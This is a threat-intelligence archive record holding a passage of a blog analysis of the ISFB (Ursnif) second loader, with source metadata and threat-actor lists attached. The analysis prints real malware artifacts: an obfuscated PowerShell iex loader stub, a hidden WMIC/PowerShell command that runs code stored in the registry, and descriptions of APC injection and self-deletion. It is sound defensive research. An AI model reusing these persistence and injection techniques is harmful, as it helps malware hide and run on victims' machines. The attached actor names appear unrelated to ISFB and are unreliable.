executable and the C2 just has an error, but on closer inspection this\nis not true – looking at both executables in HxD, we can see that one is for a 64 bit machine,\nand the other is for a 32 bit machine, which makes sense as ISFB injects into explorer.exe,\nso having the correct architecture would be useful. So, we know what the first two\nconnections are for, what is the third?\n\n\n-----\n\nIf you’ve ever read anything about ISFB in depth, you might have heard that it uses\nPowershell and the registry for persistence. Well, this is the decrypted data returned by the\nC2 on the third and final connection:\n```\n$rpgsxgd=\"jgrtkahbulw\";function vva{$sjoielxky=\n[System.Convert]::FromBase64String($args[0]);\n[System.Text.Encoding]::ASCII.GetString($sjoielxky);};[byte[]]$gfhmenc=@(@CODE@);\niex(vva(\"DQokZXJ1bXN3c3dmaD0iW0RsbEltcG9ydChgImtlcm5lbDMyYCIpXWBucHVibGljIHN0YXRpYyBl\n\n```\nAfter cleaning this up a bit and decoding the Base64, we get this:\n\nIt does look quite confusing to start of with, but don’t worry, we will get into this when it is\nactually used by the sample. Once the communication phase is complete, the loader moves\ninto the final function in the loader itself before exiting –\n**Setup_And_Exec_Next_Stage (sub_1D79B1).**\n\n\n-----\n\n**Setting Up and Executing the Next Stage**\n\nAs mentioned previously, the ISFB loader utilizes the registry quite frequently, to store\ndifferent pieces of data. Using the random value generator discussed earlier, as well as using\nfile data from the System32 directory (the loader queries several different files, gathering\nfile times etc.), the loader generates two seemingly random names based on filenames in the\nSystem32 folder, which are then used as registry key names. In this sample, the two\ngenerated names are basegcfg and ApiMider. Then, the loader copies one of the\nexecutables (depending on the system architecture) to a new region of memory, before\noverwriting both executables (not the copied one) using a similar rotating XOR algorithm\nthat was seen previously. From there, we move into quite an interesting function, called\n**Convert_EXE_Input_Powershell (sub_1D5DBC).**\n\nThis function is responsible for firstly converting each byte of the copied executable to an\ninteger, as well as altering the first DWORD of the executable to a value that seems like a\nrelative jump to an offset:\n\n\n-----\n\n```\nFirst DWORD of executable {\n  0xE9, 0x2F, 0xA8, 0x01    # 0xE9 = Relative JMP in x86 ASM, JMP 0x1a82f?\n};\n\n```\n\n-----\n\nAs the executable is executed in an unusual way, this could be a pointer to the entry point of\nthe executable, although interestingly, upon altering the entry point to said offset using PEBear and opening it up in IDA, it just points to the end of a function, so perhaps I am\nincorrect. Once the executable has been completely converted to integers, the loader then\nembeds this inside the powershell command we saw earlier. Searching for the string\n**[@CODE@, it replaces this with the converted executable. An example can be seen here, as](https://zerobin.net/?98c1d31c65e47a19#zhJB1rGHOxf808MGfxfzockS9zn0EYw2xSbNJ1VtNug=)**\nit is an extremely long script after adding the executable in, so it would take up a lot of\nspace.\n\nMoving back to the previous function, the loader calls Create_Registry_Keys\n(sub_1D4912), which, as the name suggests, creates registry keys using COM API. The\ncreated registry keys can be seen below, and are all in the same registry folder\n**Software\\AppDataLow\\Software\\Microsoft\\17B9B5BC-8A83-619D-4C3B-**\n**5E25409F7229 – everything after AppDataLow is created by the loader.**\n```\nClient32: Encrypted client 32 bit binary (Rotating XOR algorithm)\nClient64: Encrypted client 64 binary (Rotating XOR algorithm)\nbasegcfg: Powershell \"script\" containing \napiMider: WMIC Command pointing to Powershell script\n\n```\n\n-----\n\nYou might be wondering, what is this WMIC Command ? Well, the loader actually creates\na command to execute the Powershell script, rather than calling Powershell directly, and it\ncan be seen below, and it essentially executes the Powershell script stored in basegcfg:\n```\nC:\\Windows\\system32\\wbem\\wmic.exe /output:clipboard process call create \"powershell\n-w hidden iex([System.Text.Encoding]::ASCII.GetString((get-itemproperty\n'HKCU:\\Software\\AppDataLow\\Software\\Microsoft\\17B9B5BC-8A83-619D-4C3B5E25409F7229').basegcfg))\n\n```\nThis is then executed using COM API once again, rather than calling a well known API such\nas ShellExecuteExW(), which is used to execute CMD.exe.\n\nOnce this function returns, we can now see all the data and registry keys that this loader\ncreates, although the next stage also utilizes this area of the registry, so try not to get\nconfused with different keys being added.\n\nOnce everything has been setup and executed, one last function is called in the loader, and it\nis responsible for deleting the original file, leaving no visible trace of any infections. All it\ndoes is use ShellExecuteExW() to execute CMD.exe, passing a command line argument\nthat executes ping against the localhost, and then deletes itself from the system, leaving the\nnext stage running silently\n\n\n-----\n\nSo, now we know how the loader functions, lets take a quick look at that powershell script\nagain:\n\nSo, we can see that it is calling VirtualAllocEx(), which is then used as the destination\nargument for a call to Copy(), meaning the allocated memory will contain what we now\nknow is the (converted to integer) executable. Then, QueueUserAPC() is called, and as\n[described by John Arneson at Talos:](https://blog.talosintelligence.com/2019/01/amp-tracks-ursnif.html)\n```\nQueueUserAPC is executed, specifying the current thread within its process. This\ncreates a user-mode APC and queues it within the thread. To execute the malicious\nDLL from the APC queue, the thread needs to enter an alertable state. SleepEx is\nused to trigger an alertable state completing the APC injection, by specifying 1\n(True) for its second parameter which is bAlertable.\n\n```\nBy following execution of this script, we can see that it injects into explorer.exe – mainly due\nto the fact that as soon as the script executes, we can see explorer.exe communicate out to\ndifferent C2 servers. Now I’m not entirely sure on how calling QueueUserAPC() on it’s\nown thread enables the process to inject into explorer.exe, as most write-ups on APC\ninjection involve passing the thread of the process to inject into, and in this case it is passing\nit’s own thread ID. Perhaps due to the fact that it is being executed with WMI? If you want\nto learn more about APC injection, you can check out this great post by Pavel **[here.](https://blogs.microsoft.co.il/pavely/2017/03/14/injecting-a-dll-without-a-remote-thread/)**\n\nSo, that brings an end to this analysis! You can find a summary down below, as well as all\nIOCs associated with this sample – and if you would like to get a hold of the PCAP that I\n[used, DM me on Twitter (@0verfl0w_), and I can pass it on! Hopefully you learnt](https://twitter.com/0verfl0w_)\nsomething from this post, and part 3 (the final stage), should be up fairly soon! Thanks for\nreading!\n\n\n-----\n\n```\nSummary:\n  Parses \"JJ\" Structure to get RSA key + Configuration\n  Utilizes COM API to communicate to C2 servers through Internet Explorer\n    Alters three registry keys to run silently:\n      SOFTWARE\\Microsoft\\Internet Explorer\\Main\\IE10RunOnceLastShown_TIMESTAMP\n      SOFTWARE\\Microsoft\\Internet Explorer\\Main\\IE8RunOnceLastShown_TIMESTAMP\n      SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Check_Associations\n    Generates string to use in communication with C2 servers:\nsoft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x&uptime=%u\n    The string is Serpent CBC encrypted, with the 16 byte config key + 16 byte\nnulled IV\n    A random string is prepended, the string is Base64 encoded, '+' and '/' are\nreplaced with \n    hex equivalents, random '/' are added to string, '/images/' is prepended and\n'.avi' is \n    appended\n    The last 64 bytes of the received data from the C2 is RSA decrypted using\nthe RSA key\n    This block contains the MD5 hash of decrypted data, the Serpent key to\ndecrypt, and the\n    size of the data to decrypt\n    The loader reaches out 3 times, the first two to get a 32 and 64 bit\nexecutable, and the\n    third to get a Powershell script used for APC injection later on\n  The correct executable (architecture wise) is converted to integers and input\ninto the Powershell\n  script, replacing @CODE@\n  Four registry keys are created, containing the two downloaded, encrypted\nexecutables, the\n  Powershell script, and a WMIC command executing the Powershell script\n    Client32: Encrypted client 32 bit binary (Rotating XOR algorithm)\n    Client64: Encrypted client 64 binary (Rotating XOR algorithm)\n    basegcfg: Powershell \"script\" containing \n    apiMider: WMIC Command pointing to Powershell script\n  The loader then uses COM API to execute apiMider, executing the Powershell\nscript that uses\n  APC injection to inject the downloaded executable into explorer.exe\n  The loader executes CMD.exe that executes ping.exe against the localhost, and\ndeletes itself\n  from the system\n  The loader then exits, leaving the final stage running in explorer.exe\nIOCs:\n  MD5 of Second Stage Loader: 52b4480de6f4d4f32fba2b535941c284\n  MD5 of x32 Downloaded Executable: 14373f33e1907b5d82747bed1f1aacaf\n  MD5 of x64 Downloaded Executable: 468d291ca5e63470a351ac73ff3621ba\n\n## 1 Comment\n\n```\nComments are closed.\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-25 - Analyzing ISFB - The Second Loader.pdf"
    ],
    "report_names": [
        "2019-05-25 - Analyzing ISFB - The Second Loader.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535671,
    "ts_updated_at": 1743041280,
    "ts_creation_date": 1653488095,
    "ts_modification_date": 1653488095,
    "files": {
        "pdf": "https://archive.orkl.eu/28b775296bfe2a3882ede4df95e397f9883b26d3.pdf",
        "text": "https://archive.orkl.eu/28b775296bfe2a3882ede4df95e397f9883b26d3.txt",
        "img": "https://archive.orkl.eu/28b775296bfe2a3882ede4df95e397f9883b26d3.jpg"
    }
}